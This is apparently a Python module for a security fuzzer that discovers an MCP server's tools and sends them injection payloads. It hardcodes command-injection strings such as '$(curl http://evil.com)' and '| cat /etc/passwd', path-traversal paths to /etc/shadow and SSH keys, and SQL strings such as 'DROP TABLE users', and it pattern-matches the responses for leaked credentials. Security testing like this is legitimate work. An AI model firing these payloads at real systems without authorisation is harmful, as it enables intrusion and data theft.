"""
Dynamic interrogation module using LLM for adversarial fuzzing.
Discovers MCP tools and generates malicious payloads.
"""

import json
from typing import List, Dict, Any, Optional
from dataclasses import dataclass
from enum import Enum

import httpx
from rich.console import Console

console = Console()


class AttackType(str, Enum):
    """Types of attacks to generate."""

    COMMAND_INJECTION = "command_injection"
    PATH_TRAVERSAL = "path_traversal"
    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    SSRF = "ssrf"
    XXE = "xxe"


@dataclass
class FuzzPayload:
    """A fuzzing payload for testing."""

    tool_name: str
    attack_type: AttackType
    payload: Dict[str, Any]
    description: str
    is_malicious: bool


@dataclass
class FuzzResult:
    """Result from executing a fuzz payload."""

    payload: FuzzPayload
    success: bool
    response: Optional[Dict[str, Any]]
    error: Optional[str]
    leaked_data: List[str]
    suspicious_behavior: List[str]


class MCPInterrogator:
    """Interrogates MCP servers with adversarial payloads."""

    def __init__(self, server_url: str, anthropic_api_key: Optional[str] = None):
        self.server_url = server_url
        self.anthropic_api_key = anthropic_api_key
        self.client = httpx.AsyncClient(timeout=30.0)

    async def discover_tools(self) -> List[Dict[str, Any]]:
        """
        Discover available tools from the MCP server.

        Returns:
            List of tool definitions
        """
        console.print("[bold blue]Discovering MCP tools...[/bold blue]")

        try:
            response = await self.client.post(f"{self.server_url}/tools/list", json={})
            response.raise_for_status()

            data = response.json()
            tools = data.get("tools", [])

            console.print(f"[green]Found {len(tools)} tools[/green]")
            for tool in tools:
                console.print(f"  - {tool.get('name', 'unknown')}")

            return tools

        except Exception as e:
            console.print(f"[red]Error discovering tools: {e}[/red]")
            return []

    async def generate_adversarial_payloads(
        self, tool_schema: Dict[str, Any], num_valid: int = 5, num_malicious: int = 5
    ) -> List[FuzzPayload]:
        """
        Generate adversarial payloads for a tool using LLM.

        Args:
            tool_schema: The JSON schema of the tool
            num_valid: Number of valid payloads to generate
            num_malicious: Number of malicious payloads to generate

        Returns:
            List of FuzzPayload objects
        """
        console.print(
            f"[bold blue]Generating payloads for {tool_schema.get('name')}...[/bold blue]"
        )

        payloads = []

        # Generate manual payloads (hardcoded patterns)
        payloads.extend(self._generate_manual_payloads(tool_schema))

        # If Anthropic API key is available, use LLM for advanced generation
        if self.anthropic_api_key:
            llm_payloads = await self._generate_llm_payloads(tool_schema, num_valid, num_malicious)
            payloads.extend(llm_payloads)

        return payloads

    def _generate_manual_payloads(self, tool_schema: Dict[str, Any]) -> List[FuzzPayload]:
        """Generate hardcoded adversarial payloads."""
        tool_name = tool_schema.get("name", "unknown")
        input_schema = tool_schema.get("inputSchema", {})
        properties = input_schema.get("properties", {})

        payloads = []

        # Command injection patterns
        cmd_injection_patterns = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& whoami",
            "`id`",
            "$(curl http://evil.com)",
        ]

        # Path traversal patterns
        path_traversal_patterns = [
            "../../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "../../.ssh/id_rsa",
        ]

        # SQL injection patterns
        sql_injection_patterns = [
            "' OR '1'='1",
            "'; DROP TABLE users--",
            "admin'--",
            "1' UNION SELECT * FROM users--",
        ]

        # For each property in the schema, generate payloads
        for prop_name, prop_spec in properties.items():
            prop_type = prop_spec.get("type", "string")

            if prop_type == "string":
                # Command injection
                for pattern in cmd_injection_patterns[:2]:
                    payloads.append(
                        FuzzPayload(
                            tool_name=tool_name,
                            attack_type=AttackType.COMMAND_INJECTION,
                            payload={prop_name: pattern},
                            description=f"Command injection via {prop_name}",
                            is_malicious=True,
                        )
                    )

                # Path traversal
                for pattern in path_traversal_patterns[:2]:
                    payloads.append(
                        FuzzPayload(
                            tool_name=tool_name,
                            attack_type=AttackType.PATH_TRAVERSAL,
                            payload={prop_name: pattern},
                            description=f"Path traversal via {prop_name}",
                            is_malicious=True,
                        )
                    )

                # SQL injection
                for pattern in sql_injection_patterns[:2]:
                    payloads.append(
                        FuzzPayload(
                            tool_name=tool_name,
                            attack_type=AttackType.SQL_INJECTION,
                            payload={prop_name: pattern},
                            description=f"SQL injection via {prop_name}",
                            is_malicious=True,
                        )
                    )

        # Add some valid payloads
        if properties:
            valid_payload = {}
            for prop_name, prop_spec in properties.items():
                prop_type = prop_spec.get("type", "string")
                if prop_type == "string":
                    valid_payload[prop_name] = "test"
                elif prop_type == "number":
                    valid_payload[prop_name] = 42
                elif prop_type == "boolean":
                    valid_payload[prop_name] = True

            payloads.append(
                FuzzPayload(
                    tool_name=tool_name,
                    attack_type=AttackType.COMMAND_INJECTION,
                    payload=valid_payload,
                    description="Valid baseline payload",
                    is_malicious=False,
                )
            )

        return payloads

    async def _generate_llm_payloads(
        self, tool_schema: Dict[str, Any], num_valid: int, num_malicious: int
    ) -> List[FuzzPayload]:
        """Generate payloads using Claude LLM."""
        # This would integrate with Anthropic's API
        # For now, return empty list
        console.print("[yellow]LLM payload generation not yet implemented[/yellow]")
        return []

    async def execute_payload(self, payload: FuzzPayload) -> FuzzResult:
        """
        Execute a fuzz payload against the MCP server.

        Args:
            payload: The payload to execute

        Returns:
            FuzzResult with execution details
        """
        leaked_data = []
        suspicious_behavior = []

        try:
            response = await self.client.post(
                f"{self.server_url}/tools/call",
                json={"name": payload.tool_name, "arguments": payload.payload},
            )

            response_data = response.json()

            # Check for data leaks
            response_text = json.dumps(response_data).lower()

            # Check for sensitive data patterns
            if any(
                pattern in response_text
                for pattern in [
                    "aws_access_key",
                    "aws_secret",
                    "api_token",
                    "private_key",
                    "password",
                    "ssh",
                ]
            ):
                leaked_data.append("Potential credential leak detected")

            # Check for file system leaks
            if any(
                pattern in response_text
                for pattern in ["/etc/passwd", "/etc/shadow", "id_rsa", "root:x:"]
            ):
                leaked_data.append("File system information leaked")

            # Check for command execution
            if any(pattern in response_text for pattern in ["uid=", "gid=", "total ", "drwx"]):
                suspicious_behavior.append("Possible command execution")

            return FuzzResult(
                payload=payload,
                success=True,
                response=response_data,
                error=None,
                leaked_data=leaked_data,
                suspicious_behavior=suspicious_behavior,
            )

        except Exception as e:
            return FuzzResult(
                payload=payload,
                success=False,
                response=None,
                error=str(e),
                leaked_data=leaked_data,
                suspicious_behavior=suspicious_behavior,
            )

    async def run_fuzzing_campaign(
        self, tools: Optional[List[Dict[str, Any]]] = None
    ) -> List[FuzzResult]:
        """
        Run a complete fuzzing campaign against all tools.

        Args:
            tools: List of tools to fuzz, or None to discover automatically

        Returns:
            List of FuzzResult objects
        """
        if tools is None:
            tools = await self.discover_tools()

        if not tools:
            console.print("[yellow]No tools to fuzz[/yellow]")
            return []

        all_results = []

        for tool in tools:
            console.print(f"[bold]Fuzzing tool: {tool.get('name')}[/bold]")

            # Generate payloads
            payloads = await self.generate_adversarial_payloads(tool)

            # Execute payloads
            for payload in payloads:
                result = await self.execute_payload(payload)
                all_results.append(result)

                # Report findings
                if result.leaked_data or result.suspicious_behavior:
                    console.print(f"[red]⚠ ALERT: {payload.description}[/red]")
                    if result.leaked_data:
                        console.print(f"  Leaked data: {result.leaked_data}")
                    if result.suspicious_behavior:
                        console.print(f"  Suspicious: {result.suspicious_behavior}")

        return all_results

    async def close(self) -> None:
        """Close the HTTP client."""
        await self.client.aclose()
